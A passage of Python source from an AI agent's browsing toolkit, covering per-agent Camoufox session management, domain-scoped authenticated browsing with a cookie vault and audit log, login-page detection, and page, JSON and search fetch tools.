            # browser's __exit__ commonly raises (connection already gone).
            if self._cm is not None:
                try:
                    self._cm.__exit__(None, None, None)
                except Exception as exc:
                    log.debug(
                        "Camoufox __exit__ during close (agent=%s): %s",
                        self._agent_id, exc,
                    )
            self._cm = None
            self._browser = None
            self._context = None
            self._page = None
            _active_camoufox_browsers.discard(self)
            self._deregister()
            self._shutdown_executor()

    def _deregister(self) -> None:
        """Drop this instance from the per-agent registries — but only the
        entries that point at *this* object. An agent can hold more than one
        AuthBrowser at a time (interactive session + the browse_page fetch
        browser), and both carry the same `agent_id`; popping by id alone
        made whichever closed first evict the other's registration while
        that browser was still running."""
        if _active_browser_sessions.get(self._agent_id) is self:
            _active_browser_sessions.pop(self._agent_id, None)
            _session_locks.pop(self._agent_id, None)
        if _fetch_sessions.get(self._agent_id) is self:
            _fetch_sessions.pop(self._agent_id, None)

    def window_is_gone(self) -> bool:
        """True when this session no longer has a window behind it.

        Asked, not subscribed to. The sync Playwright client dispatches
        events only while its thread is inside a call, and a session whose
        agent has finished parks on its queue — so the `disconnected`
        listener attached at open never gets a chance to fire. Measured
        2026-08-13: a window closed by hand left seven Camoufox processes
        and 620 MB alive for as long as it was watched, with not one line
        in the log. The round trip here doubles as the flush that lets any
        pending event through.

        Only the browser-is-gone markers count. A timeout or a failed
        navigation leaves a perfectly usable window, and answering that by
        tearing the browser down would take the page out from under the
        person sitting in front of it."""
        if self._disconnected:
            return True
        page = self._page
        if page is None:
            return True
        try:
            page.title()
            return False
        except Exception as exc:
            return _is_session_dead(exc)

    def _on_browser_disconnected(self, *args: Any) -> None:
        """Fired by Playwright when the browser process detaches."""
        if self._disconnected:
            return
        self._disconnected = True
        log.info(
            "Camoufox browser disconnected (agent=%s) — releasing it",
            self._agent_id,
        )
        _active_camoufox_browsers.discard(self)
        self._deregister()
        # Hand the teardown to this session's own thread rather than just
        # dropping the handles: without `close()` the Camoufox context
        # manager never exits, so the driver subprocess and its pipe
        # outlive the browser and nothing can reach them afterwards — the
        # registries this method just emptied were the only way in.
        # Queued rather than called here, because this runs inside
        # Playwright's event dispatch and the teardown talks to the same
        # connection. `close()` shuts the thread down when it is done.
        executor = self._executor
        if executor is not None:
            try:
                executor.submit(self.close)
                return
            except Exception as exc:
                log.debug(
                    "could not queue close for agent=%s: %s", self._agent_id, exc
                )
        self._shutdown_executor()


def _requested_scope(domains: list[str] | None) -> frozenset[str] | None:
    """The scope a session built from `domains` would enforce.

    `None` for the unscoped session, which enforces nothing and carries no
    identity; a set of eTLD+1s otherwise. `None` and `frozenset()` are
    different answers — the second is a scope that was asked for and
    resolved to nothing, and it denies everything."""
    from dpc_client_core import web_auth

    if not domains:
        return None
    return frozenset(
        e for e in (web_auth.resolve_etld1(d) for d in domains) if e is not None
    )


def _session_scope_matches(session: "AuthBrowser", domains: list[str] | None) -> bool:
    """Whether a live session may serve a call asking for `domains`.

    Equality, not containment, in either direction: a wider live session
    answers a narrower request with reachability nobody asked for, and a
    narrower one spends an identity the caller did not ask for."""
    live = None if session._open_scope else frozenset(session._etld1s)
    return live == _requested_scope(domains)


def _get_or_create_session(
    agent_id: str, domains: list[str], headed: bool
) -> AuthBrowser:
    """Return an existing AuthBrowser for this agent or create one.

    Ark's D2 duplicate-open guard: a second `browser_*` tool call on
    the same agent reuses the live session instead of opening a second
    Camoufox subprocess. `headed` applies only when a NEW session is
    created; `domains` does not — a live session whose scope differs is
    closed and replaced, because reuse that ignored the argument is how an
    unscoped browser came to serve an authenticated call.

    Sync entry point — caller MUST be already running in the session's
    own thread (or this is the first call and the new session's
    executor is fresh). Async callers should use
    `_get_or_create_session_async` instead."""
    existing = _active_browser_sessions.get(agent_id)
    if existing is not None and existing._page is not None:
        try:
            if existing._page.is_closed():
                log.info("Stale session for %s (page closed) — recreating", agent_id)
                _active_browser_sessions.pop(agent_id, None)
            elif not _session_scope_matches(existing, domains):
                log.info(
                    "Session for %s is scoped to %s, call asks for %s — "
                    "replacing it rather than serving the wrong scope",
                    agent_id, sorted(existing._etld1s), domains,
                )
                try:
                    existing.close()
                except Exception as exc:
                    log.warning("closing mis-scoped session for %s: %s", agent_id, exc)
                _active_browser_sessions.pop(agent_id, None)
            else:
                return existing
        except Exception:
            log.info("Stale session for %s (check failed) — recreating", agent_id)
            _active_browser_sessions.pop(agent_id, None)
    session = AuthBrowser(agent_id=agent_id, domains=domains, headed=headed)
    session.start()
    _active_browser_sessions[agent_id] = session
    return session


IDLE_TIMEOUT_SECONDS = 30 * 60

# How often to ask a headed session whether its window is still there.
# The person who closed it should not wait minutes for the processes to
# follow, and the question costs one round trip to a browser that is
# already running.
WINDOW_PROBE_INTERVAL_SECONDS = 30

# One idle sweep per this many probe ticks — keeps the original five
# minutes without a second loop.
IDLE_SWEEP_EVERY_N_PROBES = 10

# The probe waits far less than an ordinary call. Sessions are asked one
# after another, so a single wedged browser would otherwise hold the whole
# tick for the two minutes an agent's own call is allowed — and every
# other window would go unnoticed for that long. A browser that cannot
# answer in ten seconds is not the case this sweep is looking for.
WINDOW_PROBE_TIMEOUT_SECONDS = 10


_SESSION_CALL_TIMEOUT = 120  # seconds — prevents hung executor from blocking the event loop forever


async def _run_in_session(
    session: "AuthBrowser", method_name: str, *args: Any,
    _touch: bool = True, _timeout: float = _SESSION_CALL_TIMEOUT,
    **kwargs: Any,
) -> Any:
    """Invoke a sync AuthBrowser method on the session's dedicated
    single-worker thread. Required because Playwright sync API objects
    (Page, Context, Browser) are thread-affine; every call must come
    from the thread that owns the connection.

    `_touch=False` for calls the housekeeping makes on its own behalf:
    the window probe runs every half minute, and counting it as use would
    keep the idle timer permanently reset — a session nobody had touched
    for hours would look busy because we kept asking whether it was."""
    if _touch:
        session._last_activity = time.monotonic()
    loop = asyncio.get_running_loop()
    method = getattr(session, method_name)
    return await asyncio.wait_for(
        loop.run_in_executor(
            session._get_executor(), lambda: method(*args, **kwargs),
        ),
        timeout=_timeout,
    )


_session_create_locks: dict[str, asyncio.Lock] = {}


async def _get_or_create_session_async(
    agent_id: str, domains: list[str], headed: bool,
) -> "AuthBrowser":
    """Async wrapper around `_get_or_create_session` that pins the
    initial `start()` to the new session's executor, so every later
    `_run_in_session` call lands on the same thread.

    Uses a per-agent asyncio.Lock to prevent duplicate browser launches
    when the LLM emits parallel browse_page tool calls in one round.

    Reuse is scope-exact — see `_session_scope_matches`."""
    if agent_id not in _session_create_locks:
        _session_create_locks[agent_id] = asyncio.Lock()
    async with _session_create_locks[agent_id]:
        existing = _active_browser_sessions.get(agent_id)
        if existing is not None and existing._page is not None:
            try:
                if existing._page.is_closed():
                    log.info("Stale session for %s (page closed) — recreating", agent_id)
                    _active_browser_sessions.pop(agent_id, None)
                elif not _session_scope_matches(existing, domains):
                    log.info(
                        "Session for %s is scoped to %s, call asks for %s — "
                        "replacing it rather than serving the wrong scope",
                        agent_id, sorted(existing._etld1s), domains,
                    )
                    try:
                        await _run_in_session(existing, "close")
                    except Exception as exc:
                        log.warning(
                            "closing mis-scoped session for %s: %s", agent_id, exc
                        )
                    _active_browser_sessions.pop(agent_id, None)
                else:
                    return existing
            except Exception:
                log.info("Stale session for %s (check failed) — recreating", agent_id)
                _active_browser_sessions.pop(agent_id, None)
        session = AuthBrowser(agent_id=agent_id, domains=domains, headed=headed)
        await _run_in_session(session, "start")
        _active_browser_sessions[agent_id] = session
        return session


async def _navigate_with_recovery(
    session: "AuthBrowser", agent_id: str, url: str, domains: list[str],
) -> "AuthBrowser":
    """Navigate, absorbing a transient failure without losing the browser.

    Order matters. A navigation can fail for two unrelated reasons, and
    they call for opposite responses:

    * the browser is gone (crashed, closed underneath us) — the session
      is unusable and must be replaced;
    * the navigation itself lost — a timeout, an aborted load, or a
      `goto` superseded by another navigation still in flight. The
      browser is fine; retrying on the same page is enough.

    Recycling on *any* exception treated the second case as the first:
    it tore down a working browser, dropped the page state, and in a
    headed session made the window vanish and a new one appear.

    Returns the session that ended up serving the navigation — the same
    one on the retry path, a fresh one after a genuine recycle.
    """
    try:
        await _run_in_session(session, "navigate", url)
        return session
    except Exception as nav_err:
        if not _is_session_dead(nav_err):
            log.info(
                "navigate failed (agent=%s, url=%s): %s — retrying on the "
                "same page (browser is alive)",
                agent_id, url, nav_err,
            )
            await _run_in_session(session, "navigate", url)
            return session
        log.warning(
            "navigate failed (agent=%s, url=%s): %s — session is dead, "
            "recreating",
            agent_id, url, nav_err,
        )
    try:
        await _run_in_session(session, "close")
    except Exception:
        pass
    _active_browser_sessions.pop(agent_id, None)
    session = await _get_or_create_session_async(agent_id, domains, True)
    await _run_in_session(session, "navigate", url)
    return session


_fetch_create_locks: dict[str, asyncio.Lock] = {}


async def _get_or_create_fetch_session(agent_id: str) -> "AuthBrowser":
    """Return this agent's headless fetch browser, opening one if needed.

    No auth domains, so `_check_domain` is a no-op and no vault entry is
    read — this browser exists only to run JS for `browse_page`."""
    if agent_id not in _fetch_create_locks:
        _fetch_create_locks[agent_id] = asyncio.Lock()
    async with _fetch_create_locks[agent_id]:
        existing = _fetch_sessions.get(agent_id)
        if existing is not None and existing._page is not None:
            try:
                if not existing._page.is_closed():
                    return existing
            except Exception:
                pass
            _fetch_sessions.pop(agent_id, None)
        session = AuthBrowser(
            agent_id=agent_id, domains=[], headed=False, anonymous=True,
        )
        await _run_in_session(session, "start")
        _fetch_sessions[agent_id] = session
        return session


async def _fetch_js_text(url: str, agent_id: Optional[str]) -> Optional[str]:
    """Render `url` in a real browser and return it as markdown.

    Reuses the agent's fetch browser across calls. Before this, every
    JS-needing page cost a full Camoufox launch and teardown — measured
    at 7 processes and ~7-10 s per call, repeated for each page in a
    research run. Falls back to the one-shot browser when no agent is
    known or the pooled one fails, so the tool never gets worse than it
    was.
    """
    if agent_id:
        try:
            session = await _get_or_create_fetch_session(agent_id)
            html = await _run_in_session(session, "fetch_html", url)
            return _html_to_markdown(html)
        except Exception as exc:
            log.warning(
                "pooled fetch browser failed (agent=%s, url=%s): %s — "
                "falling back to one-shot",
                agent_id, url, exc,
            )
            if _is_session_dead(exc):
                _fetch_sessions.pop(agent_id, None)
    return await asyncio.to_thread(
        _browse_with_camoufox, url, agent_id or "<anonymous>",
    )


def _html_to_markdown(html: str) -> str:
    """Trafilatura HTML→markdown conversion. Extracted so AuthBrowser and
    the T9 popup-fallback path share one conversion pipeline."""
    import trafilatura

    return trafilatura.extract(
        html,
        output_format="markdown",
        include_formatting=True,
        include_links=True,
        include_tables=True,
        favor_recall=True,
    ) or ""


def _auth_browse_html(
    agent_id: str, domain: str, url: str, headed: bool = True
) -> str:
    """Sync helper returning RAW HTML."""
    with AuthBrowser(agent_id=agent_id, domain=domain, headed=headed) as ab:
        ab.goto(url)
        return ab.get_page_html()


def _auth_browse(
    agent_id: str, domain: str, url: str, headed: bool = True
) -> str:
    """Wrapper around `_auth_browse_html` + `_html_to_markdown`. Kept so
    existing tests that patch `_auth_browse` directly continue to work."""
    return _html_to_markdown(_auth_browse_html(agent_id, domain, url, headed))


# THE RULE FOR THIS LIST: a marker may match text a person can see on the
# page, or an attribute a form must carry to function — never the URL of a
# script, a path segment or a JSON key. Every page of a site serves the same
# script URLs, so such a marker describes the site's infrastructure and
# answers the same on a login page and a signed-in one, which is no signal
# at all. `challenge-platform` matched Cloudflare's own script tag on every
# page of a site and came out for it; `checking your browser` is the
# Cloudflare marker that stays, being a sentence somebody reads.
#
# Do not widen the list to catch one more page. Where HTML runs to hundreds
# of kilobytes around a few hundred characters of text, any token in any
# list eventually appears on any page.
_LOGIN_PAGE_MARKERS = (
    'type="password"',
    "type='password'",
    'autocomplete="current-password"',
    "autocomplete='current-password'",
    'autocomplete="new-password"',
    "autocomplete='new-password'",
    'name="password"',
    "name='password'",
    'autocomplete="one-time-code"',
    "autocomplete='one-time-code'",
    "verification code",
    "checking your browser",
)


def _page_wants_a_login(html: str) -> bool:
    """Does this page show a sign-in, or an unfinished step of one?

    It decides one thing: whether the tool result tells the agent to say in
    the chat that a sign-in is needed. It gates no write — the vault write
    is unconditional, and what stands in front of it are facts about
    cookies, not readings of a page (see `_persist_session_cookies`).

    So both ways of being wrong cost a sentence and nothing else. A sign-in
    missed here costs a notice the person did not need, as they are looking
    at the window; a page wrongly called a sign-in costs the opposite, the
    agent telling a signed-in person to sign in and stopping there. That
    second cost does not correct itself — the next navigate runs the same
    markers over the same site's HTML and answers the same.

    Read alone it answers "no" for a blank page, a 404 and an error, none of
    which is a signed-in session, so nothing may be inferred from it
    returning False."""
    return any(marker in (html or "").lower() for marker in _LOGIN_PAGE_MARKERS)


def _no_session_message(domain: str, etld1: str, agent_id: str) -> str:
    """Why a background fetch cannot run, and what does work instead."""
    from dpc_client_core import web_auth

    stored = ", ".join(
        sorted(
            resolved
            for row in web_auth.list_domains(agent_id)
            if (resolved := web_auth.resolve_etld1(row["domain"])) is not None
        )
    ) or "none yet"
    return (
        f"⚠️ No stored session for '{domain}' (registrable domain '{etld1}'), "
        f"so a background fetch would only download a login page nobody can "
        f"see. Sites with cookies stored for this agent: {stored}.\n"
        f"Call browse_page(url=..., use_auth=\"{etld1}\", keep_open=true) "
        f"instead: that opens a window on screen, and if the site asks for a "
        f"sign-in you tell the person in the chat and wait while they do it. "
        f"What the window holds for '{etld1}' is saved as they go, so this "
        f"call works once the sign-in is finished."
    )


def _login_needed_notice(etld1: str) -> str:
    """What the agent must say in the chat, spelled out for it.

    There is no push channel from a tool into the conversation: a tool
    returns a string to the model and the model writes the chat message. So
    the string has to be unambiguous about who acts next."""
    site = etld1 or "this site"
    return (
        f"\n\n---\nA LOGIN IS NEEDED — this page is asking for a sign-in, and "
        f"the browser window for {site} is open on screen right now.\n"
        f"Say so in the chat in your own words: that {site} wants a login, "
        f"that the window is open, and that they should sign in there and "
        f"reply here when they are done. Then STOP and wait for their reply "
        f"— do not retry this page, and do not call any other tool, until "
        f"they answer. Tell them to finish the sign-in through any code or "
        f"verification step before replying: what the window holds is saved "
        f"as they go, so a sign-in stopped half way stores half a sign-in "
        f"and {site} will ask again.\n---"
    )


def _sign_in_not_saved_notice(site: str, reason: str) -> str:
    """What to say when a window's cookies did not reach the vault.

    Every reason that arrives here is about the snapshot or the write and
    none is a reading of the page: the window held nothing for this site,
    the snapshot held nothing sendable and the stored jar was kept instead,
    or the write itself failed. A refusal the person is not told about is
    indistinguishable from a silent overwrite."""
    site = site or "this site"
    return (
        f"\n\n---\nNOTHING WAS SAVED for {site} ({reason}).\n"
        f"The cookies in this window were not written, and whatever was "
        f"already stored for {site} is untouched — nothing was lost.\n"
        f"Say so in the chat in your own words: that nothing was saved and "
        f"nothing was lost, and that if they meant to sign in to {site} they "
        f"should do it in the window — all the way through any code or "
        f"verification step — and reply here when they are done. Then STOP "
        f"and wait for their reply.\n---"
    )


def _domain_of(url: str) -> str:
    """Host part of a URL, for the audit row. Never raises."""
    try:
        from urllib.parse import urlparse
        return urlparse(url).netloc or "?"
    except Exception:
        return "?"


async def browse_page(
    ctx: ToolContext,
    url: str,
    size: str = "m",
    use_auth: Optional[str] = None,
    keep_open: bool = False,
    verify: bool = False,
    save_to: Optional[str] = None,
) -> str:
    """
    Fetch a web page and extract content as structured markdown.

    Uses trafilatura for high-quality extraction that preserves headings,
    lists, tables, and links. Falls back to basic text extraction if
    trafilatura fails.

    Size presets control output length:
      s = 5K chars (quick summary)
      m = 10K chars (default)
      l = 25K chars (deep reading)
      f = full content (no truncation)

    Args:
        ctx: Tool context (agent_root used to derive agent_id when use_auth set)
        url: URL to fetch
        size: Size preset (s/m/l/f)
        save_to: write the whole markdown to this file and name it in the
            header. The body of the answer is unchanged; the file is what
            survives the tool-result cap, and read_file pages through it.
        use_auth: If set, fetch the page authenticated for this domain.
            Routes through restricted AuthBrowser with cookies from the
            agent's encrypted vault (ADR-028). The URL must be within
            the same eTLD+1 as use_auth (subdomains allowed). Returns a
            re-login prompt if cookies are missing or expired.

    Returns:
        Page content as markdown
    """
    if use_auth:
        # Contract: ctx.agent_root is ~/.dpc/agents/{agent_id}/ (see
        # dpc_agent.utils.get_agent_root). Last path component IS the
        # agent_id. If the agent storage layout changes, this derivation
        # must move to a helper there — track via grep on `agent_root.name`.
        agent_id = ctx.agent_root.name

        from dpc_client_core import web_auth as _web_auth_mod

        # `resolve_etld1` is the vault's own key and a real Public Suffix
        # List resolver, so every subdomain spelling of a site lands on the
        # one jar and no spelling reaches another site's. None means the
        # input names no registrable domain at all.
        _requested_etld1 = _web_auth_mod.resolve_etld1(use_auth)
        if _requested_etld1 is None:
            _web_auth_mod.audit_append(
                agent_id, use_auth, url, status="auth_denied:not_a_domain",
            )
            return (
                f"⚠️ '{use_auth}' is not a registrable domain — it is a public "
                f"suffix, an address, or a bare name. Cookies cannot be scoped "
                f"to it (a jar for 'com' would be one jar for every .com site), "
                f"so pass the site itself, e.g. 'example.com'."
            )
        # The only gate left on this path, and it is about capability, not
        # permission: a headless fetch with no stored session renders the
        # site's login page into a window nobody can see, and the agent then
        # reports a logged-out page as the answer. Refuse in words instead,
        # and name the way out — the visible window, where a person can act.
        # `keep_open=True` is exempt because that IS the visible window: it
        # opens with whatever the vault holds, up to and including nothing.
        if not keep_open and not _web_auth_mod.has_session(
            agent_id, _requested_etld1
        ):
            _web_auth_mod.audit_append(
                agent_id, use_auth, url, status="auth_denied:no_session",
            )
            return _no_session_message(use_auth, _requested_etld1, agent_id)

        try:
            if keep_open:
                session = await _get_or_create_session_async(
                    agent_id, [use_auth], True,
                )
                session = await _navigate_with_recovery(
                    session, agent_id, url, [use_auth],
                )
                html = await _run_in_session(session, "get_page_html")
            else:
                # headed=False, so this browser stays gated: the route gate
                # and the site's CDN manifest decide what it may reach. A
                # visible window is where that is relaxed, and nobody is
                # looking at this one.
                html = await asyncio.to_thread(
                    _auth_browse_html, agent_id, use_auth, url, False
                )
        except AuthRequiredError as e:
            _web_auth_mod.audit_append(
                agent_id, use_auth, url, status="auth_required"
            )
            return f"⚠️ {e}"
        except AuthExpiredError as e:
            _web_auth_mod.audit_append(agent_id, use_auth, url, status="expired")
            return f"⚠️ {e}"
        except ValueError as e:
            _web_auth_mod.audit_append(
                agent_id, use_auth, url, status="domain_mismatch"
            )
            return f"⚠️ {e}"
        except ImportError:
            _web_auth_mod.audit_append(
                agent_id, use_auth, url, status="camoufox_missing"
            )
            return (
                "⚠️ Camoufox browser is not installed. Run "
                "`uv sync --extra browser` in dpc-client/core to enable."
            )
        except (RuntimeError, OSError) as e:
            # Camoufox launch / browser-binary failure / page load timeout
            # — surface to the agent as a single warning rather than a raw
            # stack trace. Common cases: missing browser binary, network
            # timeout (goto's 30s default), page render hang.
            _web_auth_mod.audit_append(
                agent_id, use_auth, url, status="browser_error"
            )
            return f"⚠️ Camoufox browser failed: {e}"

        text = _html_to_markdown(html)
        # Success path — record byte size for cost / quota tracking.
        _web_auth_mod.audit_append(
            agent_id, use_auth, url, status=200, bytes_size=len(text)
        )
        saved_to, save_warning = _save_page_markdown(ctx, save_to, text)
        answer = _rendered_page_answer(
            url, html, text, size,
            session=(
                f"{'visible' if keep_open else 'headless'} browser, "
                f"auth domain {use_auth}"
            ),
            saved_to=saved_to, save_warning=save_warning,
        )
        if keep_open and _page_wants_a_login(html):
            _web_auth_mod.audit_append(
                agent_id, use_auth, url, status="login_page_shown",
            )
            answer += _login_needed_notice(_requested_etld1)
        elif keep_open and (
            declined := getattr(session, "_last_writeback_decline", None)
        ):
            # The page asks for no sign-in and the snapshot still did not
            # reach the vault — it held nothing for this site, or nothing
            # sendable. Different reason, same next act by the person.
            answer += _sign_in_not_saved_notice(_requested_etld1, declined)
        return answer

    if keep_open:
        agent_id = ctx.agent_root.name if hasattr(ctx, 'agent_root') else "anonymous"
        try:
            session = await _get_or_create_session_async(agent_id, [], True)
            session = await _navigate_with_recovery(session, agent_id, url, [])
            html = await _run_in_session(session, "get_page_html")
        except Exception as e:
            return f"⚠️ Camoufox browser failed: {e}"
        text = _html_to_markdown(html)
        saved_to, save_warning = _save_page_markdown(ctx, save_to, text)
        answer = _rendered_page_answer(
            url, html, text, size,
            session="visible browser, no auth domain named",
            saved_to=saved_to, save_warning=save_warning,
        )
        if _page_wants_a_login(html):
            answer += _login_needed_notice(_domain_of(url))
        return answer

    result = await asyncio.to_thread(_browse_sync, url)

    if not result.get("success", False) and "error" in result:
        return f"⚠️ Failed to fetch page: {result['error']}"

    text = result.get("text", "")
    sig = result.get("signals", {})
    agent_id = getattr(getattr(ctx, "agent_root", None), "name", None)
    renderer = "static"
    rendered_chars: Optional[int] = None

    if result.get("needs_js") or verify:
        js_text = await _fetch_js_text(url, agent_id)
        if js_text is not None:
            rendered_chars = len(js_text)
            if len(js_text) > len(text or ""):
                text = js_text
                renderer = "camoufox"
    max_chars = _SIZE_PRESETS.get(size, _SIZE_PRESETS["m"])
    total = len(text)
    shown = min(total, max_chars) if max_chars else total
    # Saved before the preset cuts, so the file holds the page and not the
    # window: a file that repeats what the answer already carries is no
    # continuation at all.
    saved_to, save_warning = _save_page_markdown(ctx, save_to, text)
    full_text = text
    if max_chars and total > max_chars:
        text = text[:max_chars]

    header = _completeness_header(
        url, sig, renderer, rendered_chars, shown, total, size,
        saved_to=saved_to, save_warning=save_warning,
    )
    # The anonymous path wrote no audit record at all, so the two questions
    # this header now answers had no history behind them: 3 929 audit rows on
    # 2026-08-23, every one of them from the authenticated path. One line per
    # fetch turns "is a cut transport rare?" from an opinion into a count.
    if agent_id:
        try:
            from dpc_client_core import web_auth as _wa
            _wa.log_browser_action(
                agent_id, _domain_of(url), "fetch_anonymous", url,
                result="ok",
                html_chars=sig.get("html_chars"),
                text_chars=total,
                document_closed=sig.get("document_closed"),
                script_tags=sig.get("script_tags"),
                app_shell=bool(sig.get("app_shell_markers")),
                js_capable=sig.get("js_capable"),
                needs_js=bool(result.get("needs_js")),
                renderer=renderer,
                rendered_chars=rendered_chars,
                preset=size,
                shown_chars=shown,
            )
        except Exception as e:  # auditing must never break a fetch
            log.warning("anonymous fetch audit failed (%s): %s", url, e)

    return _page_answer(header, full_text, text, saved_to)


FETCH_JSON_WINDOW = 10_000  # chars of pretty-printed JSON per call


def _json_shape(data: Any) -> str:
    """One line saying what the document is, from the already-parsed object.

    The window below is a slice of pretty-printed text, so an agent that
    sees only the first 10 000 characters cannot tell whether the part it
    is missing is one more field or ten thousand records. `json.loads` has
    already produced the whole object by this point — the shape is free,
    and it answers "what else is in here" without asking the network
    again, which the offset does not.
    """
    if isinstance(data, dict):
        keys = list(data.keys())
        shown = ", ".join(str(k) for k in keys[:12])
        more = f" +{len(keys) - 12} more" if len(keys) > 12 else ""
        return f"object with {len(keys)} top-level keys [{shown}{more}]"
    if isinstance(data, list):
        if not data:
            return "empty array"
        return f"array of {len(data)} items, first is {type(data[0]).__name__}"
    return f"scalar ({type(data).__name__})"


def fetch_json(ctx: ToolContext, url: str, offset: int = 0, limit: int | None = None) -> str:
    """
    Fetch JSON data from a URL, one window of characters at a time.

    The old form cut at 10 000 chars and appended a bare `... (truncated)`:
    no size, no way to continue, and the cut lands mid-structure so what
    came back was not parseable JSON either. The window below says how
    large the document is, which slice of it this is, and how to ask for
    the next one — and names the price, because there is no buffer here:
    a second window is a second request to the server.

    Args:
        ctx: Tool context (unused)
        url: URL to fetch
        offset: First character of the pretty-printed document to return
        limit: How many characters to return (default FETCH_JSON_WINDOW)

    Returns:
        A window of the JSON document, prefixed with its bounds
    """
    import json

    result = _fetch_url(url)

    if not result["success"]:
        return f"⚠️ Failed to fetch JSON: {result['error']}"

    try:
        data = json.loads(result["content"])
        formatted = json.dumps(data, indent=2, ensure_ascii=False)
    except json.JSONDecodeError as e:
        return f"⚠️ Invalid JSON: {e}"

    total = len(formatted)
    window = FETCH_JSON_WINDOW if limit is None else max(1, limit)
    start = max(0, offset)
    if start >= total and total:
        return (
            f"[json from {url}: {total} chars total, offset={start} is past the"
            f" end — the last window starts at offset={max(0, total - window)}]"
        )
    chunk = formatted[start:start + window]
    end = start + len(chunk)
    if start == 0 and end >= total:
        return f"JSON from {url}:\n\n{formatted}"
    return (
        f"[json from {url}: {_json_shape(data)}, {total} chars pretty-printed"
        f" | this window is chars {start}-{end} — A SLICE, not parseable JSON,"
        f" it is cut mid-structure"
        + (
            f" | next window: fetch_json(url, offset={end}) — this RE-FETCHES"
            f" the document from the network]"
            if end < total
            else " | this is the final window]"
        )
        + f"\n\n{chunk}"
    )



def check_url(ctx: ToolContext, url: str) -> str:
    """
    Check if a URL is accessible.

    Args:
        ctx: Tool context (unused)
        url: URL to check

    Returns:
        Status information
    """
    import time

    start = time.time()
    result = _fetch_url(url, timeout=10)
    elapsed = time.time() - start

    if result["success"]:
        content_length = len(result.get("content", ""))
        return f"✓ URL accessible: {url}\n" \
               f"  Status: {result.get('status_code', 'OK')}\n" \
               f"  Response time: {elapsed:.2f}s\n" \
               f"  Content size: {content_length} bytes"
    else:
        return f"✗ URL not accessible: {url}\n" \
               f"  Error: {result['error']}\n" \
               f"  Time: {elapsed:.2f}s"


def _search_ddgs_sync(query: str, max_results: int, backend: str) -> list:
    from ddgs import DDGS
    with DDGS() as ddgs:
        return list(ddgs.text(query, max_results=max_results, backend=backend))


async def search_web_ddgs(ctx: ToolContext, query: str, max_results: int = 5, backend: str = "auto") -> str:
    """
    Search the web using multiple engines via ddgs (no API key required).

    Supports 8+ backends: duckduckgo, bing, brave, google, yandex, mojeek, yahoo, wikipedia.
    Returns title + URL + snippet for each result, reducing need to browse each page.

    Args:
        ctx: Tool context (unused)
        query: Search query
        max_results: Maximum number of results (1-20)
        backend: Search backend ("auto", "duckduckgo", "bing", "brave", "google", "yandex", "mojeek", "yahoo", "wikipedia")

    Returns:
        Search results with snippets
    """
    max_results = max(1, min(max_results, 20))

    try:
        results = await asyncio.to_thread(_search_ddgs_sync, query, max_results, backend)
    except ImportError:
        return "⚠️ ddgs package not installed. Run: pip install ddgs"
    except Exception as e:
        return f"⚠️ Search failed: {e}"

    if not results:
        return f"No results found for: {query}"

    output_lines = [f"Search results for '{query}' ({len(results)} found, backend={backend}):\n"]
    for i, r in enumerate(results, 1):
        title = r.get("title", "")
        url = r.get("href", "")
        snippet = r.get("body", "")
        output_lines.append(f"  {i}. {title}\n     {url}\n     {snippet}")

    return "\n\n".join(output_lines)


def _cleanup_screenshots_lru(screenshots_dir: Path, max_keep: int = 50) -> None:
    """Drop oldest *.png files in `screenshots_dir` until at most
    `max_keep` remain. Per-agent quota enforced by the
    `browser_screenshot` handler so disk usage stays bounded."""
    if not screenshots_dir.is_dir():
        return
    pngs = sorted(
        screenshots_dir.glob("*.png"), key=lambda p: p.stat().st_mtime,
    )
    excess = len(pngs) - max_keep
    if excess <= 0:
        return
    for old in pngs[:excess]:
        try:
            old.unlink()
        except OSError:
            pass


def _load_agent_summarize_config(agent_id: str) -> tuple[Optional[str], int]:
    """Return (provider_alias, threshold) for agent snapshot
    summarization. `provider_alias=None` falls back to llm_manager's
    default_provider; `threshold` defaults to SNAPSHOT_SUMMARIZE_THRESHOLD
    when missing or invalid in agent config."""
    try:
        from dpc_client_core.dpc_agent.utils import load_agent_config
        config = load_agent_config(agent_id)
    except Exception:
        return None, SNAPSHOT_SUMMARIZE_THRESHOLD
    provider = config.get("snapshot_summarize_provider") or None
    threshold = config.get("snapshot_summarize_threshold")
    if not isinstance(threshold, int) or threshold <= 0:
        threshold = SNAPSHOT_SUMMARIZE_THRESHOLD
    return provider, threshold


async def _maybe_summarize_snapshot(
    snapshot_text: str, ctx: ToolContext, agent_id: str,
) -> str:
    """Apply Phase 2 LLM summarization or Phase 1 line truncation when
    `snapshot_text` exceeds the per-agent threshold; pass through
    otherwise. Reads provider + threshold from agent config and pulls
    llm_manager from `ctx.dpc_service`.

    No task is passed to the summarizer. The only candidate on the
    context is `current_task_type`, which is the literal "chat" for
    every agent turn; handing that over as the user's task made the
    auxiliary model answer "is there a chat widget on this page?" and
    drop the elements the agent had navigated there to use. Without a
    task it keeps interactive elements and their refs, which is what
    the caller needs."""
    if not snapshot_text:
        return snapshot_text
    provider, threshold = _load_agent_summarize_config(agent_id)
    if len(snapshot_text) <= threshold:
        return snapshot_text
    llm_manager = None
    dpc_service = getattr(ctx, "dpc_service", None)
    if dpc_service is not None:
        llm_manager = getattr(dpc_service, "llm_manager", None)
    return await _llm_summarize_snapshot(
        snapshot_text, None, llm_manager,
        provider_alias=provider, max_chars=threshold,
    )


_NO_SESSION_MSG = (
    "⚠️ No active browser session. Call "
    "browse_page(url, use_auth=<domain>, keep_open=true) first."
)


def _get_session_or_error(agent_id: str) -> Optional["AuthBrowser"]:
    session = _active_browser_sessions.get(agent_id)
    if session is None or session._page is None:
        return None
    return session


def _format_scrollable_hints(containers: list[dict]) -> str:
    """Format detected scrollable containers as CSS hints for the agent."""
    if not containers:
        return ""
    lines = ["\n\n📋 Scrollable containers detected (use with browser_collect):"]
    for c in containers:
        item_hint = ""
        if c.get("itemSelector"):
            item_hint = f", items: \"{c['itemSelector']}\""
        lines.append(
            f"  • \"{c['container']}\" ({c.get('itemCount', '?')} children{item_hint})"
        )
    return "\n".join(lines)


async def browser_snapshot(ctx: ToolContext, raw: bool = False) -> str:
    """Return the current page's accessibility-tree snapshot tagged
    with @eN ref ids. Routes oversized snapshots through the per-agent
    summarization config (LLM if configured, else line truncate).
    When raw=True, skip summarization and return the full tree."""
    agent_id = ctx.agent_root.name
    session = _get_session_or_error(agent_id)
    if session is None:
        return _NO_SESSION_MSG
    lock = _get_session_lock(agent_id)
    async with lock:
        try:
            tree, _refs = await _run_in_session(session, "a11y_snapshot")
        except Exception as e:
            log.warning(
                "snapshot failed (agent=%s): %s: %s",
                agent_id, type(e).__name__, str(e).split(chr(10))[0],
            )
